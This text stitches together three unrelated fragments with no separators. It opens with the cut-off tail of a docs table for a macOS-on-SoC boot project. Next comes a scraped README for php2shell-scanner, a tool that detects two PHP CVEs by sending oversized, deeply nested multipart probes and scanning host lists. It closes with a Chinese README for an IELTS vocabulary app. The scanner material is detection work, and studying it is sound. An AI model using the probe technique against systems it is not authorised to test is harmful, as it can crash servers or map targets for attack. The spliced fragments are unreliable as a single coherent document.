kexts, plug-in and compiler | | [docs/RUNNING.md](docs/RUNNING.md) | a boot cycle with `tools/cycle.py` | | [docs/KERNEL-PATCHES.md](docs/KERNEL-PATCHES.md) | the opt-in kernel patches and why each exists | | [docs/BOOT-CHAIN.md](docs/BOOT-CHAIN.md) | how a stock macOS kernel boots on this SoC | | [docs/FULL-INSTALL.md](docs/FULL-INSTALL.md) | installing to and booting from the internal NVMe | | [docs/COMPATIBILITY.md](docs/COMPATIBILITY.md) | guest/host boundaries and pinned profiles | | [gpu/air2ir3/README.md](gpu/air2ir3/README.md) | the shader compiler | | [docs/WORKSPACE-LAYOUT.md](docs/WORKSPACE-LAYOUT.md) | local inputs, generated output and what is never committed | | [docs/GUI-BOOT-ROADMAP.md](docs/GUI-BOOT-ROADMAP.md) | the path from the first kernel instruction to the desktop |

items.title: assetnote/php2shell-scanner
items.description: High fidelity scanner for php2shell (CVE-2026-109618 and CVE-2026-109619)
items.readme:
# php2shell-scanner

A command-line tool for detecting CVE-2026-109618 and CVE-2026-109619 in PHP applications.

## How It Works

The scanner sends a minimal multipart control request followed by up to three crafted multipart probes. The probes use PHP array keys nested 62 levels deep and increase from 1 MiB to 20 MiB, matching the detection logic used by Assetnote's internal scanner.

A target is reported vulnerable when the probe produces a PHP memory-exhaustion error, a differential empty HTTP 500, a PHP-FPM worker failure, or an advertised PHP version known to be unpatched. Initial 5xx responses, common request-rejection statuses, and nonempty HTTP 500 responses without the PHP fatal-error signature are not treated as crash signals.

The scanner tests `/index.php` by default. A path supplied in the URL is preserved, and `--path` or `--path-file` can test custom paths. phpMyAdmin targets are automatically retested at `/show_config_errors.php`. Redirects are not followed unless `--follow-redirects` is set.

### SAPI Modes

The default `--sapi auto` mode applies both mod_php and PHP-FPM verdict rules, matching the combined behavior of Assetnote's postmodules. Use `--sapi mod_php` or `--sapi fpm` to restrict detection to a known SAPI.

### Network Impact

Each tested path may receive a 42-byte control request and three probes totalling about 29 MiB. Probing stops as soon as the verdict is settled, and duplicate input URLs are scanned once.

## Requirements

- Python 3.9+
- h11
- tqdm

## Installation

```
pip install -r requirements.txt
```

### Docker

Build the image:

```
docker build -t php2shell-scanner .
```

Run it with the same options as `scanner.py`:

```
docker run --rm php2shell-scanner -u https://example.com
```

Mount the current directory to read host lists and write results:

```
docker run --rm -v "$PWD:/data" -w /data php2shell-scanner -l hosts.txt -o results.json
```

## Usage

Scan a single host:

```
python3 scanner.py -u https://example.com
```

Scan a list of hosts:

```
python3 scanner.py -l hosts.txt
```

Scan with multiple threads and save results:

```
python3 scanner.py -l hosts.txt -t 20 -o results.json
```

Scan with custom headers:

```
python3 scanner.py -u https://example.com -H "Authorization: Bearer token" -H "Cookie: session=abc"
```

Scan a custom path:

```
python3 scanner.py -u https://example.com --path /phpinfo.php
python3 scanner.py -u https://example.com --path /index.php --path /admin.php
python3 scanner.py -u https://example.com --path-file paths.txt
```

Use only PHP-FPM verdict rules:

```
python3 scanner.py -u https://example.com --sapi fpm
```

## Options

```
-u, --url         Single URL to check
-l, --list        File containing hosts (one per line)
-t, --threads     Number of concurrent threads (default: 10)
--timeout         Request timeout in seconds (default: 60)
-o, --output      Output file for results (JSON)
--all-results     Save all results, not just vulnerable hosts
-k, --insecure    Disable TLS certificate verification
--follow-redirects Follow HTTP redirects (up to 10 hops)
-H, --header      Custom header (can be used multiple times)
-v, --verbose     Show verdict reasons and response snippets
-q, --quiet       Only output vulnerable hosts
--no-color        Disable colored output
--sapi            Verdict rules: auto, mod_php, or fpm (default: auto)
--path            Custom path to test (can be used multiple times)
--path-file       File containing paths to test (one per line)
```

## Credits

The first, original discovery of php2shell is attributed to the Calif team. You can read their write up here: [https://calif.io/php2shell/](https://calif.io/php2shell/).

The scanner was built by the Assetnote Security Research Team using logic built for [Searchlight's Exposure Platform](https://www.slcyber.io/exposure).

## Output

Results are printed to the terminal. When using `-o`, vulnerable hosts are saved to a JSON file with the verdict reason and redacted HTTP request/response evidence.

## Limitations

On specific PHP configurations, the scanner may report a false positive when its multipart probe exceeds PHP's `memory_limit`. Patched and vulnerable versions can then return the same empty HTTP 500 response.

This was reproduced on patched PHP 8.4.27 with `memory_limit` values from **2M to 32M**, and on PHP 8.3.36 at **128M** when `max_multipart_body_parts` is set to **2785 or higher**. The exact threshold may vary between builds.

When PHP does not disclose its version, the scanner cannot distinguish this safe post-patch OOM from the vulnerable pre-patch behavior. Results should therefore be verified against the installed PHP version and any vendor backports

# 词光 · Word Atlas **一词一画，点亮雅思。** 7,298 个雅思核心词，每个词一幅原创插画、两条原创例句、英美发音和一套刚刚好的复习节奏。
免费，开源，无需注册，打开网页就能背。 [**打开词光 →**](https://0xlei.tech/words/)  ·  [▶ 看宣传片](docs/assets/launch.mp4)  ·  [下载词库](data/)  ·  [**在 X 关注更新 →**](https://x.com/yangleiocx3)  ·  [English](README.en.md) ![MIT](https://img.shields.io/badge/code-MIT-1E2640) ![CC BY 4.0](https://img.shields.io/badge/content-CC%20BY%204.0-C4573A) ![words](https://img.shields.io/badge/words-7%2C298-7F9B77) ![FSRS](https://img.shields.io/badge/scheduler-FSRS%206-D9A03A) ![no login](https://img.shields.io/badge/login-not%20required-6F93AE) ![GitHub stars](https://img.shields.io/github/stars/designfuchen/word-atlas?style=flat&color=E8B65A) [![Follow on X](https://img.shields.io/badge/X-@yangleiocx3-111?logo=x&logoColor=white)](https://x.com/yangleiocx3) 每本单词书都从 abandon 开始，也停在 abandon。▶ 点击画面看 48 秒完整宣传片（有声音）
--- ## 为什么做词光 背单词最难的不是“看过”，而是“想得起来”。 纸质单词书把 7,000 个词排成一张清单，大多数人翻到第一页就停下了。词光换了个做法：给每个词一幅画，让你先**看见**它；用主动回忆让你**想起**它；再用 FSRS 算法在你快要忘记的时候让你和它**重逢**。你学会的每一个词，都会在自己的词汇星图上点亮一颗星。 这是一个个人项目。所有释义、例句、插画和录音都是为这个项目新做的，制作成本由作者自己承担，然后全部开源，任何人都可以免费使用、修改和再分发。 ## 一眼看懂 | 数量 | 内容 | |---:|---| | **7,298** | 雅思核心词条，CEFR A1–C2 分级，19 个雅思高频话题 | | **7,298** | 幅原创插画，统一的复古图鉴画风，画的就是例句里的场景 | | **14,596** | 条原创例句：一条日常短句帮你记住，一条雅思语境长句帮你会用 | | **22,905** | 段录音：英音、美音单词发音，以及例句朗读 | | **0** | 账号、广告、追踪。进度只保存在你自己的设备上 | ## 看一看，听一听 7,298 幅插画、22,905 段录音、24 段界面声音，都是为词光专门做的。下面是一小部分。 ### 🖼 每个词一幅画 画面讲的就是例句里的那件事，同一种复古图鉴画风贯穿全部 7,298 个词。

abandon 遗弃；抛弃
We had to abandon our car in the snow.
volcano 火山
We watched steam rising from the volcano across the lake.
orchestra 管弦乐队
The orchestra began playing as the lights dimmed.
telescope 望远镜
We watched the moon through a telescope on the balcony.

migrate 迁徙；移居
These birds migrate south when the weather turns cold.
festival 节日；庆祝活动
Our town holds a lantern festival every autumn.
lighthouse 灯塔
The lighthouse beam swept across the dark sea.
astronaut 宇航员；航天员
The astronaut floated gently through the small space station.
### 🔊 每个词都会读 拿 *abandon* 举例，点开就能听（在线播放）： | | | |---|---| | 🇬🇧 英音 | [abandon /əˈbændən/](https://0xlei.tech/words/atlas/audio/uk/abandon.mp3) | | 🇺🇸 美音 | [abandon /əˈbændən/](https://0xlei.tech/words/atlas/audio/us/abandon.mp3) | | 📖 例句朗读 | [We had to abandon our car in the snow.](https://0xlei.tech/words/atlas/audio/ex/abandon.mp3) | 全部 7,298 个词都有英音、美音和例句朗读，还有 1,011 个重点词的第二条例句也配了朗读。 ### 🎧 整个应用都有声音 | | | |---|---| | 🎙 **开屏配音** | [「欢迎打开雅思大门」](https://0xlei.tech/words/sfx/splash-voice.mp3)：星尘汇聚成“词光”，大门打开 | | 🌌 **星图配音** | [「这是你的词汇星图。每学会一个词，就点亮一颗星。」](https://0xlei.tech/words/sfx/voice-galaxy-hello.mp3) | | 🎵 **星空音乐** | [一段可无缝循环的原创配乐](https://0xlei.tech/words/sfx/amb-stars.mp3)，默认陪你背词 | | 🌧 **6 段环境声** | [雨天图书馆](https://0xlei.tech/words/sfx/amb-rain.mp3) · [清晨海岸](https://0xlei.tech/words/sfx/amb-sea.mp3) · [林间早晨](https://0xlei.tech/words/sfx/amb-forest.mp3) · [夜晚壁炉](https://0xlei.tech/words/sfx/amb-fire.mp3) · [远航船舱](https://0xlei.tech/words/sfx/amb-voyage.mp3) · [安静咖啡馆](https://0xlei.tech/words/sfx/amb-cafe.mp3) | | ✨ **界面音效** | 答对、答错、翻卡、打字、连胜、点亮星星……每个操作都有自己的声音；读单词时背景音会自动压低 | 全部素材都在仓库里：插画在 `public/atlas/img/`，录音在 `public/atlas/audio/`，这两类按 CC BY 4.0 开放；界面声音和配乐在 `public/sfx/`，随应用一起提供。 ## 每个词都有什么 | | | |---|---| | 🖼 **一幅插画** | 画面讲的就是第一条例句里的事。抽象词也用具体场景表达，比如 *abandon* 是雪地里被丢下的车。 | | 🔊 **英美发音** | 英音、美音分别合成，例句也会读（AI 语音，ElevenLabs）。 | | ✍️ **两条原创例句** | 日常句 + 雅思语境句（教育、环境、科技、城市……），都配自然的中文翻译。 | | 📚 **中英释义** | 最多 3 个常用义项，按雅思使用频率排序，附简明英文解释。 | | 🧩 **搭配、词族、近反义** | 高频搭配带中文，词族之间可以互相跳转。 | | 💡 **一条提示** | 易混词、用法陷阱或记忆方法，不编造词源。 | ## 词汇星图 7,298 个词就是 7,298 颗星。19 个话题各成一条旋臂，简单的词在中心，难的在外缘。没学的是星尘，学习中的会发光，掌握了的燃成白色，今天新点亮的是金色。拖动旋转、滚动缩放，点任意一颗星就能打开它的词卡。 星图用 WebGL2 自定义着色器渲染，不支持的设备会自动降级。 ## 怎么帮你记住 - **主动回忆**：看义选词、看图补句、听音辨词、拼写，四种题型从“认得”走到“会写”。 - **FSRS 间隔复习**：和新版 Anki 同款的开源记忆算法，只在你快要遗忘时安排复习，目标记忆率可调。 - **诚实的统计**：只有第一次作答计分。答错的词会换个题型再练，但重试不会抬高正确率。 - **从你的水平开始**：选 A2 / B1 / B2 / C1 起点，跳过已经熟悉的词。 - **打字工作室**：单词、例句抄写、整句听写三种模式，WPM 和准确率单独统计，不影响记忆数据。 - **声音设计**：每个操作都有温和的木琴、纸张和铃声音效；一段星空音乐和 6 段环境声（雨天图书馆、清晨海岸、夜晚壁炉……）陪你专注，读单词时自动压低。 - **开屏仪式**：星尘汇聚成“词光”，大门打开，“欢迎打开雅思大门”。每天一次，可以关掉。 - **离线可用**：看过的词、插画和音频都缓存在本地，没网也能复习。 - **分享卡片**：任何一个词、每天的学习成果，都能一键生成图片。 - **备份恢复**：进度可以导出成文件，换设备时导入即可。
## 一份可以自由使用的词库 `data/` 里是完整词库，内容采用 **CC BY 4.0**：注明出处即可自由使用、修改、商用。 | 文件 | 内容 | |---|---| | [`data/word-atlas.json`](data/word-atlas.json) | 完整结构化数据 | | [`data/word-atlas.csv`](data/word-atlas.csv) | 表格版，可直接导入 Excel / Anki | | `public/atlas/img/` | 7,298 幅 512 px WebP 插画（另有 256 px 缩略图） | | `public/atlas/audio/` | `uk/` `us/` 单词发音，`ex/` `ex2/` 例句朗读，MP3 | ```json { "id": "principle", "w": "principle", "uk": "/ˈprɪnsəpəl/", "us": "/ˈprɪnsəpəl/", "senses": [{ "pos": "n.", "zh": "原则；行为准则", "en": "A belief or rule that guides decisions and behaviour." }], "ex": [ { "en": "I refused the extra money as a matter of principle.", "zh": "出于原则，我拒绝了那笔额外的钱。" }, { "en": "The principle of equal opportunity should guide policies designed to improve access to higher education.", "zh": "…" } ], "col": ["in principle｜原则上", "basic principle｜基本原则"], "fam": ["principled (adj.)"], "tip": "principle 是原则；principal 是校长、主要的。", "cefr": "B2", "topic": "thinking" } ``` 三行代码就能用起来： ```python import json words = json.load(open("data/word-atlas.json", encoding="utf-8")) b2_env = [w for w in words if w["cefr"] == "B2" and w["topic"] == "environment"] ``` 可以拿它做 Anki 牌组、背词小程序、浏览器插件、AI 应用的评测集，或者你自己的研究。字段说明见 [docs/dataset.md](docs/dataset.md)。 ## 本地运行 需要 Node.js 20+。 ```bash git clone https://github.com/designfuchen/word-atlas.git cd word-atlas npm ci npm run dev ``` 打开 `http://localhost:5188`。同一 Wi-Fi 下的手机可以访问终端里显示的 Network 地址。 ```bash npm test # 单元测试 npm run check:atlas # 校验词库结构与媒体文件 npm run build # 生产构建，输出到 dist/ ``` 部署就是把 `dist/` 放到任意静态托管。子路径部署用 `ATLAS_BASE=/words/ npm run build`，见 [docs/deployment.md](docs/deployment.md)。 ## 内容是怎么做出来的 词表来自常见的雅思阅读核心词，去重后 7,298 个词条。词条内容全部是本项目新写的： 1. **文字**：大语言模型按统一的词典编写规范，逐词生成释义、例句、搭配和提示，再做结构和一致性校验。 2. **插画**：图像模型按统一画风逐词绘制，画面对应第一条例句。 3. **声音**：英音、美音和例句朗读由 ElevenLabs 合成；界面音效和环境声同样为本项目生成。 生成脚本在 [`scripts/atlas/`](scripts/atlas)，完整流程见 [docs/pipeline.md](docs/pipeline.md)，记忆模型见 [docs/learning-model.md](docs/learning-model.md)。 > **诚实说明**：内容经过了结构、引用和一致性的自动校验，但没有逐条人工审校，可能有个别不准确的释义、例句或插画。发现问题欢迎提 Issue，或者直接修改 `data/` 提 PR。这不是官方雅思词表，也不承诺提分。 ## 关注更新 词光的新功能、背词方法和幕后制作，都会先发在 X：[@yangleiocx3](https://x.com/yangleiocx3)。
觉得有用，点个 Star，也欢迎来 X 打个招呼、提建议。 [![Follow @yangleiocx3 on X](https://img.shields.io/badge/在%20X%20关注-@yangleiocx3-111?style=for-the-badge&logo=x&logoColor=white)](https://x.com/yangleiocx3) ## 参与贡献 - **纠错**：在 Issue 里写清楚词条 id 和问题，或者直接提 PR。每一处纠错都会让下一个人背得更准。 - **新功能**：先开 Issue 讨论，保持“无账号、本地优先、安静好看”的方向。 - **代码**：TypeScript 严格模式，`npm test` 和 `npm run check:atlas` 需要通过。 详见 [CONTRIBUTING.md](CONTRIBUTING.md)。 ## 授权 - 代码：[MIT](LICENSE) - 词库文本、插画、录音：[CC BY 4.0](CONTENT_LICENSE.md)，署名 “Word Atlas contributors（词光）” - 字体 Fraunces：SIL Open Font License；记忆算法 [ts-fsrs](https://github.com/open-spaced-repetition/ts-fsrs)：MIT ## Star 趋势 [![Star History Chart](https://api.star-history.com/svg?repos=designfuchen/word-atlas&type=Date)](https://star-history.com/#designfuchen/word-atlas&Date)
